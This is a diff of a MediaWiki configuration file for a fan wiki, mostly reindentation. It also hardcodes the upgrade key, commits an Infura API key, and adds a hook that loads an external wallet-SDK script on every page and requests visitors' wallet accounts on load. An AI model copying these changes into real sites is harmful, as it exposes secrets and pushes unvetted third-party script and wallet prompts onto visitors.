@@ -11,52 +11,52 @@
 # https://www.mediawiki.org/wiki/Manual:Configuration_settings
 
 # Protect against web entry
-if ( !defined( 'MEDIAWIKI' ) ) {
-	exit;
-}
+    if ( !defined ( 'MEDIAWIKI' ) ) {
+        exit;
+    }
 
 
 ## Uncomment this to disable output compression
 # $wgDisableOutputCompression = true;
-
-$wgSitename = "wizzypedia";
-$wgMetaNamespace = "Wizzypedia";
-
-$wgShowExceptionDetails = true;
+    
+    $wgSitename      = "wizzypedia";
+    $wgMetaNamespace = "Wizzypedia";
+    
+    $wgShowExceptionDetails = true;
 
 ## The URL base path to the directory containing the wiki;
 ## defaults for all runtime URL paths are based off of this.
 ## For more information on customizing the URLs
 ## (like /w/index.php/Page_title to /wiki/Page_title) please see:
 ## https://www.mediawiki.org/wiki/Manual:Short_URL
-$wgScriptPath = "";
+    $wgScriptPath = "";
 
 ## The protocol and server name to use in fully-qualified URLs
-$wgServer = "https://wizzypedia.forgottenrunes.com";
+    $wgServer = "https://wizzypedia.forgottenrunes.com";
 
 ## The URL path to static resources (images, scripts, etc.)
-$wgResourceBasePath = $wgScriptPath;
+    $wgResourceBasePath = $wgScriptPath;
 
 ## The URL paths to the logo.  Make sure you change this from the default,
 ## or else you'll overwrite your logo when you upgrade!
-$wgLogos = [
-	'1x' => "$wgResourceBasePath/resources/assets/square-logo.png",
-	
-	
-	'icon' => "$wgResourceBasePath/resources/assets/change-your-logo-icon.svg",
-];
+    $wgLogos = [
+        '1x' => "$wgResourceBasePath/resources/assets/square-logo.png",
+        
+        
+        'icon' => "$wgResourceBasePath/resources/assets/change-your-logo-icon.svg",
+    ];
 
 ## UPO means: this is also a user preference option
-
-$wgEnableEmail = true;
-$wgEnableUserEmail = true; # UPO
-
-$wgEmergencyContact = "maguswazir@gmail.com";
-$wgPasswordSender = "maguswazir@gmail.com";
-
-$wgEnotifUserTalk = false; # UPO
-$wgEnotifWatchlist = false; # UPO
-$wgEmailAuthentication = false;
+    
+    $wgEnableEmail     = true;
+    $wgEnableUserEmail = true; # UPO
+    
+    $wgEmergencyContact = "maguswazir@gmail.com";
+    $wgPasswordSender   = "maguswazir@gmail.com";
+    
+    $wgEnotifUserTalk      = false; # UPO
+    $wgEnotifWatchlist     = false; # UPO
+    $wgEmailAuthentication = false;
 
 ## Database settings
 $wgDBtype = "mysql";
@@ -66,81 +66,78 @@ $wgDBuser = getenv("DB_USER");
 $wgDBpassword = getenv("DB_PASS");
 
 # MySQL specific settings
-$wgDBprefix = "";
+    $wgDBprefix = "";
 
 # MySQL table options to use during installation or update
-$wgDBTableOptions = "ENGINE=InnoDB, DEFAULT CHARSET=binary";
+    $wgDBTableOptions = "ENGINE=InnoDB, DEFAULT CHARSET=binary";
 
 # Shared database table
 # This has no effect unless $wgSharedDB is also set.
-$wgSharedTables[] = "actor";
+    $wgSharedTables[] = "actor";
 
 ## Shared memory settings
-$wgMainCacheType = CACHE_NONE;
-$wgMemCachedServers = [];
+    $wgMainCacheType    = CACHE_NONE;
+    $wgMemCachedServers = [];
 
 ## To enable image uploads, make sure the 'images' directory
 ## is writable, then set this to true:
-$wgEnableUploads = true;
-$wgUseImageMagick = true;
-$wgImageMagickConvertCommand = "/usr/bin/convert";
-
-$wgFileExtensions = array( 'png', 'gif', 'jpg', 'jpeg');
+    $wgEnableUploads             = true;
+    $wgUseImageMagick            = true;
+    $wgImageMagickConvertCommand = "/usr/bin/convert";
+    
+    $wgFileExtensions = array ( 'png', 'gif', 'jpg', 'jpeg' );
 
 # InstantCommons allows wiki to use images from https://commons.wikimedia.org
-$wgUseInstantCommons = false;
+    $wgUseInstantCommons = false;
 
 # Periodically send a pingback to https://www.mediawiki.org/ with basic data
 # about this MediaWiki instance. The Wikimedia Foundation shares this data
 # with MediaWiki developers to help guide future development efforts.
-$wgPingback = false;
+    $wgPingback = false;
 
 # Site language code, should be one of the list in ./languages/data/Names.php
-$wgLanguageCode = "en";
+    $wgLanguageCode = "en";
 
 # Time zone
-$wgLocaltimezone = "UTC";
+    $wgLocaltimezone = "UTC";
 
 ## Set $wgCacheDirectory to a writable directory on the web server
 ## to make your wiki go slightly faster. The directory should not
 ## be publicly accessible from the web.
 #$wgCacheDirectory = "$IP/cache";
-
-$wgSecretKey = getenv("SECRET_KEY");
+    
+    $wgSecretKey = getenv ( "SECRET_KEY" );
 
 # Changing this will log out all existing sessions.
-$wgAuthenticationTokenVersion = "1";
+    $wgAuthenticationTokenVersion = "1";
 
 # Site upgrade key. Must be set to a string (default provided) to turn on the
 # web installer while LocalSettings.php is in place
-$wgUpgradeKey = getenv("UPGRADE_KEY");
+    $wgUpgradeKey = '343e8bbb1031756a';
 
 ## For attaching licensing metadata to pages, and displaying an
 ## appropriate copyright notice / icon. GNU Free Documentation
 ## License and Creative Commons licenses are supported so far.
-$wgRightsPage = ""; # Set to the title of a wiki page that describes your license/copyright
-$wgRightsUrl = "";
-$wgRightsText = "";
-$wgRightsIcon = "";
+    $wgRightsPage = "";             # Set to the title of a wiki page that describes your license/copyright
+    $wgRightsUrl  = "";
+    $wgRightsText = "";
+    $wgRightsIcon = "";
 
 # Path to the GNU diff3 utility. Used for conflict resolution.
-$wgDiff3 = "/usr/bin/diff3";
-
-wfLoadSkin( 'Vector' );
-$wgDefaultSkin = 'vector';
-
-
-
-
-
-$wgFavicon = $wgScriptPath . "/resources/assets/favicon.png";
-
-$wgAllowExternalImages = true;
+    $wgDiff3 = "/usr/bin/diff3";
+    
+    wfLoadSkin ( 'Vector' );
+    $wgDefaultSkin = 'vector';
+    
+    
+    $wgFavicon = $wgScriptPath . "/resources/assets/favicon.png";
+    
+    $wgAllowExternalImages = true;
 
 ## https://www.mediawiki.org/wiki/Manual:$wgMaxAnimatedGifArea
-$wgMaxAnimatedGifArea = 1000000000;
+    $wgMaxAnimatedGifArea = 1000000000;
     
-wfLoadExtension( 'AWS' );
+    wfLoadExtension ( 'AWS' );
 
 // Configure AWS credentials.
 // THIS IS NOT NEEDED if your EC2 instance has an IAM instance profile.
@@ -160,24 +157,24 @@ $wgAWSBucketName = getenv("S3_NAME");
 // While there are no more performance losses by using such a scheme, it might make things messy. Hence, it's
 // still a good idea to use one bucket per wiki unless you are approaching your 1,000 bucket per account limit.
 // $wgAWSBucketTopSubdirectory = "/$wgDBname"; # leading slash is required
-$wgAWSBucketTopSubdirectory = "/ttqfd9eooxmdfdav"; # leading slash is required
+    $wgAWSBucketTopSubdirectory = "/ttqfd9eooxmdfdav"; # leading slash is required
 
 //Extensions (we should move this into one big array at some point)
-wfLoadExtension( 'VisualEditor' );
-wfLoadExtension( 'TemplateStyles' );
-wfLoadExtension( 'UploadWizard' );
-wfLoadExtension( 'Scribunto' );
-wfLoadExtension( 'Cargo' );
-wfLoadExtension( 'DataTransfer' );
-wfLoadExtension( 'PageForms' );
-wfLoadExtension( 'ParserFunctions' );
-$wgPFEnableStringFunctions = true;
-wfLoadExtension( 'Poem' );
-wfLoadExtension( 'Nuke' );
-wfLoadExtension( 'WikiEditor' );
-wfLoadExtension( 'CodeEditor' );
-$wgDefaultUserOptions['usebetatoolbar'] = 1;
-wfLoadExtension( 'ImageMap' );
+    wfLoadExtension ( 'VisualEditor' );
+    wfLoadExtension ( 'TemplateStyles' );
+    wfLoadExtension ( 'UploadWizard' );
+    wfLoadExtension ( 'Scribunto' );
+    wfLoadExtension ( 'Cargo' );
+    wfLoadExtension ( 'DataTransfer' );
+    wfLoadExtension ( 'PageForms' );
+    wfLoadExtension ( 'ParserFunctions' );
+    $wgPFEnableStringFunctions = true;
+    wfLoadExtension ( 'Poem' );
+    wfLoadExtension ( 'Nuke' );
+    wfLoadExtension ( 'WikiEditor' );
+    wfLoadExtension ( 'CodeEditor' );
+    $wgDefaultUserOptions[ 'usebetatoolbar' ] = 1;
+    wfLoadExtension ( 'ImageMap' );
 // wfLoadExtension( 'ConfirmAccount' );
 // $wgGroupPermissions['*']['createaccount'] = false;
 // $wgGroupPermissions['bureaucrat']['createaccount'] = true;
@@ -192,59 +189,82 @@ wfLoadExtension( 'ImageMap' );
 // 	'Links'           => [ 'enabled' => false ],
 // 	'TermsOfService'  => [ 'enabled' => false ],
 // ];
-wfLoadExtension( 'TwitterTag' );
-wfLoadExtension( 'AutoSitemap' );
-
-$wgAutoSitemap["notify"] = [
-    'https://www.google.com/webmasters/sitemaps/ping?sitemap=https://wizzypedia.forgottenrunes.com/sitemap.xml',
-];
-
-$wgAutoSitemap["priority"] = 0.5;
+    wfLoadExtension ( 'TwitterTag' );
+    wfLoadExtension ( 'AutoSitemap' );
+    
+    $wgAutoSitemap[ "notify" ] = [
+        'https://www.google.com/webmasters/sitemaps/ping?sitemap=https://wizzypedia.forgottenrunes.com/sitemap.xml',
+    ];
+    
+    $wgAutoSitemap[ "priority" ] = 0.5;
 
 // Enable Popups extension
-wfLoadExtensions( [
-    'TextExtracts',
-    'PageImages',
-    'Popups'
-] );
-$wgPopupsHideOptInOnPreferencesPage = true;
-
-$wgScribuntoDefaultEngine = 'luastandalone';
+    wfLoadExtensions ( [
+                           'TextExtracts',
+                           'PageImages',
+                           'Popups'
+                       ] );
+    $wgPopupsHideOptInOnPreferencesPage = true;
+    
+    $wgScribuntoDefaultEngine = 'luastandalone';
 //$wgScribuntoEngineConf['luastandalone']['luaPath'] = '/app/extensions/Scribunto/includes/engines/LuaStandalone/binaries/lua5_1_5_linux_64_generic/lua';
 
 
 # End of automatically generated settings.
 # Add more configuration options below.
-
-
-$wgUploadWizardConfig = [
-	'tutorial' => [
-	 	'skip' => true
-	], // Skip the tutorial
-	'defaults' => [
-		// Initial value for the description field.
-		'description' => 'Uploaded by UploadWizard'
-	]
-];
+    
+    
+    $wgUploadWizardConfig = [
+        'tutorial' => [
+            'skip' => true
+        ], // Skip the tutorial
+        'defaults' => [
+            // Initial value for the description field.
+            'description' => 'Uploaded by UploadWizard'
+        ]
+    ];
 
 // Group permissions
 // Anonymous users can't create pages or edit pages
-$wgGroupPermissions['*']['createpage'] = false;
-$wgGroupPermissions['*']['edit'] = false;
-
-$wgArticlePath = "/$1";
+    $wgGroupPermissions[ '*' ][ 'createpage' ] = false;
+    $wgGroupPermissions[ '*' ][ 'edit' ]       = false;
+    
+    $wgArticlePath = "/$1";
 
 // https://phabricator.wikimedia.org/T310013
-$wgShowEXIF = function_exists( 'exif_read_data' );
+    $wgShowEXIF = function_exists ( 'exif_read_data' );
 
 
 // Custom page protection
-$wgGroupPermissions['barren-group'] = $wgGroupPermissions['autoconfirmed'];
+    $wgGroupPermissions[ 'barren-group' ] = $wgGroupPermissions[ 'autoconfirmed' ];
 # add an additional protection level restricting edit/move/etc. to users with the "barren" permission
-$wgRestrictionLevels[] = 'barren'; 
+    $wgRestrictionLevels[] = 'barren';
 # give the "barren" permission to users in the "barren-group" group
-$wgGroupPermissions['barren-group']['barren'] = true;
+    $wgGroupPermissions[ 'barren-group' ][ 'barren' ] = true;
 # give the "barren" permission to sysops (needed so sysops can apply this protection level to pages)
-$wgGroupPermissions['sysop']['barren'] = true;
-
-$wgGroupPermissions['*']['createaccount'] = false;
+    $wgGroupPermissions[ 'sysop' ][ 'barren' ] = true;
+    
+    $wgGroupPermissions[ '*' ][ 'createaccount' ] = false;
+    
+    function add_html_to_head ( &$out, &$skin ) {
+        $script = '<script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
+                    <script>
+                      const MMSDK = new MetaMaskSDK.MetaMaskSDK({
+                        dappMetadata: {
+                          name: "Example Pure JS Dapp",
+                          url: window.location.href,
+                        },
+                        infuraAPIKey: "9bef97c5dbce4f3d942a4f44f7b042fd",
+                        // Other options.
+                      });
+                      // Because the init process of MetaMask SDK is async.
+                      setTimeout(() => {
+                        // You can also access via window.ethereum.
+                        const ethereum = MMSDK.getProvider();
+                    
+                        ethereum.request({ method: "eth_requestAccounts" });
+                      }, 0);
+                    </script>';
+        $out -> addHeadItem ( 'my_html_code', $script );
+    }
+    $wgHooks[ 'BeforePageDisplay' ][] = 'add_html_to_head';
